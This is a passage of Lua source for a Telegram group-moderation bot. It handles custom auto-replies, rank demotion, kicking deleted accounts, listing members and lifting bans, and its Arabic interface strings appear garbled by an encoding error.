local list = database:smembers(bot_id.."Tshake:List:Rd:Sudo")
text = "\nββΏΩΨ§Ψ¦ΩΨ© Ψ±Ψ―ΩΨ― Ψ§ΩΩΨ·ΩΨ± \nΒ«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β»\n"
for k,v in pairs(list) do
if database:get(bot_id.."Tshake:Add:Rd:Sudo:Gif"..v) then
db = "ΩΨͺΨ­Ψ±ΩΩ π­"
elseif database:get(bot_id.."Tshake:Add:Rd:Sudo:vico"..v) then
db = "Ψ¨Ψ΅ΩΩ π’"
elseif database:get(bot_id.."Tshake:Add:Rd:Sudo:stekr"..v) then
db = "ΩΩΨ΅Ω π"
elseif database:get(bot_id.."Tshake:Add:Rd:Sudo:Text"..v) then
db = "Ψ±Ψ³Ψ§ΩΩ β"
elseif database:get(bot_id.."Tshake:Add:Rd:Sudo:Photo"..v) then
db = "Ψ΅ΩΨ±Ω π"
elseif database:get(bot_id.."Tshake:Add:Rd:Sudo:Video"..v) then
db = "ΩΩΨ―ΩΩ πΉ"
elseif database:get(bot_id.."Tshake:Add:Rd:Sudo:File"..v) then
db = "ΩΩΩ π"
elseif database:get(bot_id.."Tshake:Add:Rd:Sudo:Audio"..v) then
db = "Ψ§ΨΊΩΩΩ π΅"
end
text = text..""..k.." >> ("..v..") Β» {"..db.."}\n"
end
if #list == 0 then
text = "β«οΈβΏΩΨ§ ΩΩΨ¬Ψ― Ψ±Ψ―ΩΨ― ΩΩΩΨ·ΩΨ±"
end
send(msg.chat_id_, msg.id_,"["..text.."]")
end
if text or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.animation_ or msg.content_.audio_ or msg.content_.document_ or msg.content_.photo_ or msg.content_.video_ then  
local test = database:get(bot_id.."Tshake:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."Tshake:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
database:del(bot_id.."Tshake:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_)
if msg.content_.sticker_ then   
database:set(bot_id.."Tshake:Add:Rd:Sudo:stekr"..test, msg.content_.sticker_.sticker_.persistent_id_)  
end   
if msg.content_.voice_ then  
database:set(bot_id.."Tshake:Add:Rd:Sudo:vico"..test, msg.content_.voice_.voice_.persistent_id_)  
end   
if msg.content_.animation_ then   
database:set(bot_id.."Tshake:Add:Rd:Sudo:Gif"..test, msg.content_.animation_.animation_.persistent_id_)  
end  
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."Tshake:Add:Rd:Sudo:Text"..test, text)  
end  
if msg.content_.audio_ then
database:set(bot_id.."Tshake:Add:Rd:Sudo:Audio"..test, msg.content_.audio_.audio_.persistent_id_)  
end
if msg.content_.document_ then
database:set(bot_id.."Tshake:Add:Rd:Sudo:File"..test, msg.content_.document_.document_.persistent_id_)  
end
if msg.content_.video_ then
database:set(bot_id.."Tshake:Add:Rd:Sudo:Video"..test, msg.content_.video_.video_.persistent_id_)  
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_group = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_group = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_group = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_group = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
database:set(bot_id.."Tshake:Add:Rd:Sudo:Photo"..test, photo_in_group)  
end
send(msg.chat_id_, msg.id_,"πβΏΨͺΩ Ψ­ΩΨΈ Ψ§ΩΨ±Ψ― Ψ¨ΩΨ¬Ψ§Ψ­")
return false  
end  
end

if text == "Ψ§ΨΆΩ Ψ±Ψ― ΨΉΨ§Ω" and DevTshake(msg) then 
send(msg.chat_id_, msg.id_,"π βΏ Ψ§Ψ±Ψ³Ω Ψ§ΩΩΩΩΩ Ψ§ΩΨͺΨ±Ω ΨͺΨ±ΩΨ― Ψ§ΨΆΨ§ΩΨͺΩΨ§")
database:set(bot_id.."Tshake:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
return false 
end
if text == "Ψ­Ψ°Ω Ψ±Ψ― ΨΉΨ§Ω" and DevTshake(msg) then 
send(msg.chat_id_, msg.id_,"β«οΈβΏ Ψ§Ψ±Ψ³Ω Ψ§ΩΩΩΩΩ Ψ§ΩΨͺΨ±Ω ΨͺΨ±ΩΨ― Ψ­Ψ°ΩΩΨ§")
database:set(bot_id.."Tshake:Set:On"..msg.sender_user_id_..":"..msg.chat_id_,true)
return false 
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."Tshake:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, 'π βΏΨ§ΩΨ§Ω Ψ§Ψ±Ψ³Ω Ψ§ΩΨ±Ψ― Ψ§ΩΨ°Ω ΨͺΨ±ΩΨ― Ψ§ΨΆΨ§ΩΨͺΩ \nπ βΏ ΩΨ― ΩΩΩΩ (ΩΩΩ - ΩΨ―ΩΩ - ΩΨ΅ - ΩΩΨ΅Ω - Ψ¨Ψ΅ΩΩ - ΩΨͺΨ­Ψ±ΩΩ )\nββΏ ΩΩΩΩΩ Ψ§ΨΆΨ§ΩΩ Ψ§ΩΩ Ψ§ΩΩΨ΅ :\n- `#username` > Ψ§Ψ³Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω\n- `#msgs` > ΨΉΨ―Ψ― Ψ±Ψ³Ψ§Ψ¦Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω\n- `#name` > Ψ§Ψ³Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω\n- `#id` > Ψ§ΩΨ―Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω\n- `#stast` > ΩΩΩΨΉ Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω \n- `#edit` > ΨΉΨ―Ψ― Ψ§ΩΨ³Ψ­ΩΨ§Ψͺ ')
database:set(bot_id.."Tshake:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_, "true1")
database:set(bot_id.."Tshake:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_, text)
database:sadd(bot_id.."Tshake:List:Rd:Sudo", text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."Tshake:Set:On"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_,"πβΏΨͺΩ Ψ§Ψ²Ψ§ΩΨ© Ψ§ΩΨ±Ψ― ΩΩ ΩΨ§Ψ¦ΩΩ Ψ±Ψ―ΩΨ― Ψ§ΩΩΨ·ΩΨ±")
list = {"Add:Rd:Sudo:Audio","Add:Rd:Sudo:File","Add:Rd:Sudo:Video","Add:Rd:Sudo:Photo","Add:Rd:Sudo:Text","Add:Rd:Sudo:stekr","Add:Rd:Sudo:vico","Add:Rd:Sudo:Gif"}
for k,v in pairs(list) do
database:del(bot_id..'Tshake:'..v..text)
end
database:del(bot_id.."Tshake:Set:On"..msg.sender_user_id_..":"..msg.chat_id_)
database:srem(bot_id.."Tshake:List:Rd:Sudo", text)
return false
end
end

if text and not database:get(bot_id.."Tshake:Reply:Sudo"..msg.chat_id_) then
if not database:sismember(bot_id..'Tshake:Spam:Group'..msg.sender_user_id_,text) then
local anemi = database:get(bot_id.."Tshake:Add:Rd:Sudo:Gif"..text)   
local veico = database:get(bot_id.."Tshake:Add:Rd:Sudo:vico"..text)   
local stekr = database:get(bot_id.."Tshake:Add:Rd:Sudo:stekr"..text)     
local Text = database:get(bot_id.."Tshake:Add:Rd:Sudo:Text"..text)   
local photo = database:get(bot_id.."Tshake:Add:Rd:Sudo:Photo"..text)
local video = database:get(bot_id.."Tshake:Add:Rd:Sudo:Video"..text)
local document = database:get(bot_id.."Tshake:Add:Rd:Sudo:File"..text)
local audio = database:get(bot_id.."Tshake:Add:Rd:Sudo:Audio"..text)

if Text then 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,data)
local NumMsg = database:get(bot_id..'Tshake:messageUser'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local TotalMsg = Total_message(NumMsg)
local Status_Gps = Get_Rank(msg.sender_user_id_,msg.chat_id_)
local message_edit = database:get(bot_id..'Tshake:message_edit'..msg.chat_id_..msg.sender_user_id_) or 0
local Text = Text:gsub('#username',(data.username_ or 'ΩΨ§ ΩΩΨ¬Ψ―')) 
local Text = Text:gsub('#name',data.first_name_)
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',message_edit)
local Text = Text:gsub('#msgs',NumMsg)
local Text = Text:gsub('#stast',Status_Gps)
send(msg.chat_id_, msg.id_,Text)
database:sadd(bot_id.."Tshake:Spam:Group"..msg.sender_user_id_,text) 
end,nil)
end
if stekr then 
sendSticker(msg.chat_id_,msg.id_,stekr) 
database:sadd(bot_id.."Tshake:Spam:Group"..msg.sender_user_id_,text) 
end
if veico then 
sendVoice(msg.chat_id_, msg.id_,veico,"")
database:sadd(bot_id.."Tshake:Spam:Group"..msg.sender_user_id_,text) 
end
if video then 
sendVideo(msg.chat_id_, msg.id_,video,"")
database:sadd(bot_id.."Tshake:Spam:Group"..msg.sender_user_id_,text) 
end
if anemi then 
sendAnimation(msg.chat_id_, msg.id_,anemi,"")   
database:sadd(bot_id.."Tshake:Spam:Group"..msg.sender_user_id_,text) 
end
if document then
sendDocument(msg.chat_id_, msg.id_, document)     
database:sadd(bot_id.."Tshake:Spam:Group"..msg.sender_user_id_,text) 
end  
if audio then
sendAudio(msg.chat_id_,msg.id_,audio)  
database:sadd(bot_id.."Tshake:Spam:Group"..msg.sender_user_id_,text) 
end
if photo then
sendPhoto(msg.chat_id_,msg.id_,photo,"")
database:sadd(bot_id.."Tshake:Spam:Group"..msg.sender_user_id_,text) 
end  
end
end
if text == 'Ψ·Ψ±Ψ― Ψ§ΩΩΨ­Ψ°ΩΩΩΩ' or text == 'ΩΨ³Ψ­ Ψ§ΩΩΨ­Ψ°ΩΩΩΩ' then  
if Addictive(msg) then    
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),offset_ = 0,limit_ = 1000}, function(arg,del)
for k, v in pairs(del.members_) do
tdcli_function({ID = "GetUser",user_id_ = v.user_id_},function(b,data) 
if data.first_name_ == false then
Kick_Group(msg.chat_id_, data.id_)
end
end,nil)
end
send(msg.chat_id_, msg.id_,'ββΏΨͺΩ Ψ·Ψ±Ψ― Ψ§ΩΨ­Ψ³Ψ§Ψ¨Ψ§Ψͺ Ψ§ΩΩΨ­Ψ°ΩΩΩ')
end,nil)
end
end

if text == "ΨͺΩΨΉΩΩ Ψ±Ψ―ΩΨ― Ψ§ΩΩΨ―ΩΨ±" and Owner(msg) then   
database:del(bot_id.."Tshake:Reply:Manager"..msg.chat_id_)  
send(msg.chat_id_, msg.id_,"π?βΏΨͺΩ ΨͺΩΨΉΩΩ Ψ±Ψ―ΩΨ― Ψ§ΩΩΨ―ΩΨ±") 
end
if text == "ΨͺΨΉΨ·ΩΩ Ψ±Ψ―ΩΨ― Ψ§ΩΩΨ―ΩΨ±" and Owner(msg) then  
database:set(bot_id.."Tshake:Reply:Manager"..msg.chat_id_,true)  
send(msg.chat_id_, msg.id_,"π?βΏΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ±Ψ―ΩΨ― Ψ§ΩΩΨ―ΩΨ±" ) 
end
if text == "ΨͺΩΨΉΩΩ Ψ±Ψ―ΩΨ― Ψ§ΩΩΨ·ΩΨ±" and Owner(msg) then   
database:del(bot_id.."Tshake:Reply:Sudo"..msg.chat_id_)  
send(msg.chat_id_, msg.id_,"π?βΏΨͺΩ ΨͺΩΨΉΩΩ Ψ±Ψ―ΩΨ― Ψ§ΩΩΨ·ΩΨ±" ) 
end
if text == "ΨͺΨΉΨ·ΩΩ Ψ±Ψ―ΩΨ― Ψ§ΩΩΨ·ΩΨ±" and Owner(msg) then  
database:set(bot_id.."Tshake:Reply:Sudo"..msg.chat_id_,true)   
send(msg.chat_id_, msg.id_,"π?βΏΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ±Ψ―ΩΨ― Ψ§ΩΩΨ·ΩΨ±" ) 
end
if text and text:match("^ΨͺΩΨ²ΩΩ Ψ§ΩΩΩ @(.*)$") and Owner(msg) then 
local username = text:match("^ΨͺΩΨ²ΩΩ Ψ§ΩΩΩ @(.*)$")
function Function_Tshake(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"πβΏΨΉΨ°Ψ±Ψ§ ΨΉΨ²ΩΨ²Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω ΩΨ§Ψ°Ψ§ ΩΨΉΨ±Ω ΩΩΨ§Ψ© ΩΨ±Ψ¬Ω Ψ§Ψ³ΨͺΨ?Ψ―Ψ§Ω Ψ§ΩΨ§ΩΨ± Ψ¨Ψ΅ΩΨ±Ω Ψ΅Ψ­ΩΨ­Ω !")   
return false 
end      
if tonumber(SUDO) == tonumber(result.id_) then
send(msg.chat_id_, msg.id_,"πβΏ ΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ ΨͺΩΨ²ΩΩ Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω")
return false 
end
if database:sismember(bot_id.."Tshake:Sudo:User",result.id_) then
dev = "Ψ§ΩΩΨ·ΩΨ± Ψ" else dev = "" end
if database:sismember(bot_id.."Tshake:Basic:Constructor"..msg.chat_id_, result.id_) then
crr = "ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω Ψ" else crr = "" end
if database:sismember(bot_id.."Tshake:Constructor"..msg.chat_id_, result.id_) then
cr = "ΩΩΨ΄Ψ¦ Ψ" else cr = "" end
if database:sismember(bot_id.."Tshake:Manager"..msg.chat_id_, result.id_) then
own = "ΩΨ―ΩΨ± Ψ" else own = "" end
if database:sismember(bot_id.."Tshake:Mod:User"..msg.chat_id_, result.id_) then
mod = "Ψ§Ψ―ΩΩ Ψ" else mod = "" end
if database:sismember(bot_id.."Tshake:Special:User"..msg.chat_id_, result.id_) then
vip = "ΩΩΩΨ² Ψ" else vip = ""
end
if Rank_Checking(result.id_,msg.chat_id_) ~= false then
send(msg.chat_id_, msg.id_,"\nπ¨βΏΨͺΩ ΨͺΩΨ²ΩΩ Ψ§ΩΨ΄Ψ?Ψ΅ ΩΩ Ψ§ΩΨ±ΨͺΨ¨ Ψ§ΩΨͺΨ§ΩΩΩ \nπ βΏ { "..dev..""..crr..""..cr..""..own..""..mod..""..vip.." } \n")
else
send(msg.chat_id_, msg.id_,"\nπΈβΏΩΩΨ³ ΩΨ―ΩΩ Ψ±ΨͺΨ¨ Ψ­ΨͺΩ Ψ§Ψ³ΨͺΨ·ΩΨΉ ΨͺΩΨ²ΩΩΩ \n")
end
if tonumber(Id_Sudo) == tonumber(msg.sender_user_id_) then
database:srem(bot_id.."Tshake:Sudo:User", result.id_)
database:srem(bot_id.."Tshake:Basic:Constructor"..msg.chat_id_,result.id_)
database:srem(bot_id.."Tshake:Constructor"..msg.chat_id_, result.id_)
database:srem(bot_id.."Tshake:Manager"..msg.chat_id_, result.id_)
database:srem(bot_id.."Tshake:Mod:User"..msg.chat_id_, result.id_)
database:srem(bot_id.."Tshake:Special:User"..msg.chat_id_, result.id_)
elseif database:sismember(bot_id.."Tshake:Sudo:User",msg.sender_user_id_) then
database:srem(bot_id.."Tshake:Mod:User"..msg.chat_id_, result.id_)
database:srem(bot_id.."Tshake:Special:User"..msg.chat_id_, result.id_)
database:srem(bot_id.."Tshake:Manager"..msg.chat_id_, result.id_)
database:srem(bot_id.."Tshake:Constructor"..msg.chat_id_, result.id_)
database:srem(bot_id.."Tshake:Basic:Constructor"..msg.chat_id_,result.id_)
elseif database:sismember(bot_id.."Tshake:Basic:Constructor"..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id.."Tshake:Mod:User"..msg.chat_id_, result.id_)
database:srem(bot_id.."Tshake:Special:User"..msg.chat_id_, result.id_)
database:srem(bot_id.."Tshake:Manager"..msg.chat_id_, result.id_)
database:srem(bot_id.."Tshake:Constructor"..msg.chat_id_, result.id_)
elseif database:sismember(bot_id.."Tshake:Constructor"..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id.."Tshake:Mod:User"..msg.chat_id_, result.id_)
database:srem(bot_id.."Tshake:Special:User"..msg.chat_id_, result.id_)
database:srem(bot_id.."Tshake:Manager"..msg.chat_id_, result.id_)
elseif database:sismember(bot_id.."Tshake:Manager"..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id.."Tshake:Mod:User"..msg.chat_id_, result.id_)
database:srem(bot_id.."Tshake:Special:User"..msg.chat_id_, result.id_)
end
else
send(msg.chat_id_, msg.id_,"πβΏΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
end

if text == ("ΨͺΩΨ²ΩΩ Ψ§ΩΩΩ") and msg.reply_to_message_id_ ~= 0 and Owner(msg) then
function Function_Tshake(extra, result, success)
if tonumber(SUDO) == tonumber(result.sender_user_id_) then
send(msg.chat_id_, msg.id_,"πβΏ ΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ ΨͺΩΨ²ΩΩ Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω")
return false 
end
if database:sismember(bot_id.."Tshake:Sudo:User",result.sender_user_id_) then
dev = "Ψ§ΩΩΨ·ΩΨ± Ψ" else dev = "" end
if database:sismember(bot_id.."Tshake:Basic:Constructor"..msg.chat_id_, result.sender_user_id_) then
crr = "ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω Ψ" else crr = "" end
if database:sismember(bot_id.."Tshake:Constructor"..msg.chat_id_, result.sender_user_id_) then
cr = "ΩΩΨ΄Ψ¦ Ψ" else cr = "" end
if database:sismember(bot_id.."Tshake:Manager"..msg.chat_id_, result.sender_user_id_) then
own = "ΩΨ―ΩΨ± Ψ" else own = "" end
if database:sismember(bot_id.."Tshake:Mod:User"..msg.chat_id_, result.sender_user_id_) then
mod = "Ψ§Ψ―ΩΩ Ψ" else mod = "" end
if database:sismember(bot_id.."Tshake:Special:User"..msg.chat_id_, result.sender_user_id_) then
vip = "ΩΩΩΨ² Ψ" else vip = ""
end
if Rank_Checking(result.sender_user_id_,msg.chat_id_) ~= false then
send(msg.chat_id_, msg.id_,"\nπ¨βΏΨͺΩ ΨͺΩΨ²ΩΩ Ψ§ΩΨ΄Ψ?Ψ΅ ΩΩ Ψ§ΩΨ±ΨͺΨ¨ Ψ§ΩΨͺΨ§ΩΩΩ \nπ βΏ { "..dev..""..crr..""..cr..""..own..""..mod..""..vip.." } \n")
else
send(msg.chat_id_, msg.id_,"\nπΈβΏΩΩΨ³ ΩΨ―ΩΩ Ψ±ΨͺΨ¨ Ψ­ΨͺΩ Ψ§Ψ³ΨͺΨ·ΩΨΉ ΨͺΩΨ²ΩΩΩ \n")
end
if tonumber(Id_Sudo) == tonumber(msg.sender_user_id_) then
database:srem(bot_id.."Tshake:Sudo:User", result.sender_user_id_)
database:srem(bot_id.."Tshake:Basic:Constructor"..msg.chat_id_,result.sender_user_id_)
database:srem(bot_id.."Tshake:Constructor"..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id.."Tshake:Manager"..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id.."Tshake:Mod:User"..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id.."Tshake:Special:User"..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id.."Tshake:Sudo:User",msg.sender_user_id_) then
database:srem(bot_id.."Tshake:Mod:User"..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id.."Tshake:Special:User"..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id.."Tshake:Manager"..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id.."Tshake:Constructor"..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id.."Tshake:Basic:Constructor"..msg.chat_id_,result.sender_user_id_)
elseif database:sismember(bot_id.."Tshake:Basic:Constructor"..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id.."Tshake:Mod:User"..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id.."Tshake:Special:User"..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id.."Tshake:Manager"..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id.."Tshake:Constructor"..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id.."Tshake:Constructor"..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id.."Tshake:Mod:User"..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id.."Tshake:Special:User"..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id.."Tshake:Manager"..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id.."Tshake:Manager"..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id.."Tshake:Mod:User"..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id.."Tshake:Special:User"..msg.chat_id_, result.sender_user_id_)
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
end
if text == ("ΨͺΨ΅ΩΩΩ") and msg.reply_to_message_id_ == 0 and BasicConstructor(msg) then
send(msg.chat_id_, msg.id_,"\nπ¨Β¦ ΨͺΩ ΨͺΩΨ²ΩΩ Ψ¬ΩΩΨΉ Ψ§ΩΨ±ΨͺΨ¨  \n")
database:del(bot_id.."Tshake:Constructor"..msg.chat_id_)
database:del(bot_id.."Tshake:Manager"..msg.chat_id_)
database:del(bot_id.."Tshake:Mod:User"..msg.chat_id_)
database:del(bot_id.."Tshake:Special:User"..msg.chat_id_)
end
if text == "ΨͺΨ§Ω ΩΩΩΩ" and Addictive(msg) then
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""), offset_ = 0,limit_ = 200},function(ta,taha)
local t = "\nββΏ ΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ§ΨΉΨΆΨ§Ψ‘ \nβββββββββββββ\n"
x = 0
local list = taha.members_
for k, v in pairs(list) do
x = x + 1
if database:get(bot_id.."Tshake:User:Name"..v.user_id_) then
t = t..""..x.." - {[@"..database:get(bot_id.."Tshake:User:Name"..v.user_id_).."]}\n"
else
t = t..""..x.." - {"..v.user_id_.."}\n"
end
end
send(msg.chat_id_,msg.id_,t)
end,nil)
end

if text == "Ψ±ΨͺΨ¨ΨͺΩ" then
local rtp = database:get(bot_id.."Tshake:Comd:New:rt:User:"..msg.chat_id_..msg.sender_user_id_) or Get_Rank(msg.sender_user_id_,msg.chat_id_)
send(msg.chat_id_, msg.id_,"πβΏ Ψ±ΨͺΨ¨ΨͺΩ ΩΩ Ψ§ΩΨ¨ΩΨͺ Β» "..rtp)
end
if text == "Ψ§Ψ³ΩΩ"  then 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(extra,result,success)
if result.first_name_  then
first_name = "β¨βΏ Ψ§Ψ³ΩΩ Ψ§ΩΨ§ΩΩ β {`"..(result.first_name_).."`}"
else
first_name = ""
end   
if result.last_name_ then 
last_name = "πβΏ Ψ§Ψ³ΩΩ Ψ§ΩΨ«Ψ§ΩΩ β {`"..result.last_name_.."`}" 
else
last_name = ""
end      
send(msg.chat_id_, msg.id_,first_name.."\n"..last_name) 
end,nil)
end 
if text==("ΨΉΨ―Ψ― Ψ§ΩΨ¬Ψ±ΩΨ¨") and Addictive(msg) then  
if msg.can_be_deleted_ == false then 
send(msg.chat_id_,msg.id_,"πβΏ Ψ§ΩΨ¨ΩΨͺ ΩΩΨ³ Ψ§Ψ―ΩΩ ΩΩΨ§ \n") 
return false  
end 
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,ta) 
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
local taha = "π€βΏ ΨΉΨ―Ψ― Ψ§ΩΨ§Ψ―ΩΩΩΩ : "..data.administrator_count_..
"\n\nπ·βΏ ΨΉΨ―Ψ― Ψ§ΩΩΨ·Ψ±ΩΨ―ΩΩ : "..data.kicked_count_..
"\n\nπ₯βΏ ΨΉΨ―Ψ― Ψ§ΩΨ§ΨΉΨΆΨ§Ψ‘ : "..data.member_count_..
"\n\nπ¨βΏ ΨΉΨ―Ψ― Ψ±Ψ³Ψ§Ψ¦Ω ΩΨ§ΩΨ¬Ψ±ΩΨ¨ : "..(msg.id_/2097152/0.5)..
"\n\nπ―βΏ Ψ§Ψ³Ω Ψ§ΩΩΨ¬ΩΩΨΉΩ : ["..ta.title_.."]"
send(msg.chat_id_, msg.id_, taha) 
end,nil)
end,nil)
end 
if text == "Ψ§Ψ·Ψ±Ψ―ΩΩ" or text == "Ψ·Ψ±Ψ―ΩΩ" then
if not database:get(bot_id.."Tshake:Kick:Me"..msg.chat_id_) then
if Rank_Checking(msg.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, "\nπβΏ ΨΉΨ°Ψ±Ψ§ ΩΨ§ Ψ§Ψ³ΨͺΨ·ΩΨΉ Ψ·Ψ±Ψ― ( "..Get_Rank(msg.sender_user_id_,msg.chat_id_).." )")
return false
end
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=msg.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,"πβΏ ΩΩΨ³ ΩΨ―Ω Ψ΅ΩΨ§Ψ­ΩΨ© Ψ­ΨΈΨ± Ψ§ΩΩΨ³ΨͺΨ?Ψ―ΩΩΩ ΩΨ±Ψ¬Ω ΨͺΩΨΉΩΩΩΨ§ !") 
return false  
end
if (data and data.code_ and data.code_ == 3) then 
send(msg.chat_id_, msg.id_,"πβΏ Ψ§ΩΨ¨ΩΨͺ ΩΩΨ³ Ψ§Ψ―ΩΩ ΩΨ±Ψ¬Ω ΨͺΨ±ΩΩΨͺΩ !") 
return false  
end
if data and data.code_ and data.code_ == 400 and data.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_, msg.id_,"πβΏ ΨΉΨ°Ψ±Ψ§ ΩΨ§ Ψ§Ψ³ΨͺΨ·ΩΨΉ Ψ·Ψ±Ψ― Ψ§Ψ―ΩΩΩΨ© Ψ§ΩΩΨ¬ΩΩΨΉΩ") 
return false  
end
if data and data.ID and data.ID == "Ok" then
send(msg.chat_id_, msg.id_,"π·βΏ ΨͺΩ Ψ·Ψ±Ψ―Ω ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ ") 
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = msg.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
return false
end
end,nil)   
else
send(msg.chat_id_, msg.id_,"πβΏ Ψ§ΩΨ± Ψ§Ψ·Ψ±Ψ―ΩΩ ΨͺΩ ΨͺΨΉΨ·ΩΩΩ ΩΩ ΩΨ¨Ω Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘ ") 
end
end

if text == "ΨͺΩΨΉΩΩ Ψ§Ψ·Ψ±Ψ―ΩΩ" and Owner(msg) then   
database:del(bot_id.."Tshake:Kick:Me"..msg.chat_id_)  
send(msg.chat_id_, msg.id_,Text) 
end
if text == "ΨͺΨΉΨ·ΩΩ Ψ§Ψ·Ψ±Ψ―ΩΩ" and Owner(msg) then  
database:set(bot_id.."Tshake:Kick:Me"..msg.chat_id_,true)  
Text = "\nβ«οΈβΏΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ± Ψ§Ψ·Ψ±Ψ―ΩΩ"
send(msg.chat_id_, msg.id_,Text) 
end

if text and text:match("^Ψ±ΩΨΉ Ψ§ΩΩΩΩΨ― @(.*)") and Owner(msg) then 
local username = text:match("^Ψ±ΩΨΉ Ψ§ΩΩΩΩΨ― @(.*)") 
function Function_Tshake(extra, result, success)
if result.id_ then
if DevTshake(msg) then
database:srem(bot_id.."Tshake:GBan:User",result.id_)
database:srem(bot_id.."Tshake:Ban:User"..msg.chat_id_,result.id_)
database:srem(bot_id.."Tshake:Muted:User"..msg.chat_id_,result.id_)
usertext = "\nπ€βΏ Ψ§ΩΨΉΨΆΩ Β» ["..result.title_.."](t.me/"..(username or "kenwa")..")"
status  = "\nβ«οΈβΏ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΩΩΩΨ― ΨΉΩΩ"
texts = usertext..status
send(msg.chat_id_, msg.id_,texts)
else
database:srem(bot_id.."Tshake:Ban:User"..msg.chat_id_,result.id_)
database:srem(bot_id.."Tshake:Muted:User"..msg.chat_id_,result.id_)
Reply_Status(msg,result.id_,"reply","\nβ«οΈβΏ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΩΩΩΨ― ΨΉΩΩ")  
end
else
Text = "β«οΈβΏ Ψ§ΩΩΨΉΨ±Ω ΨΊΩΨ·"
send(msg.chat_id_, msg.id_,Text)
end
end
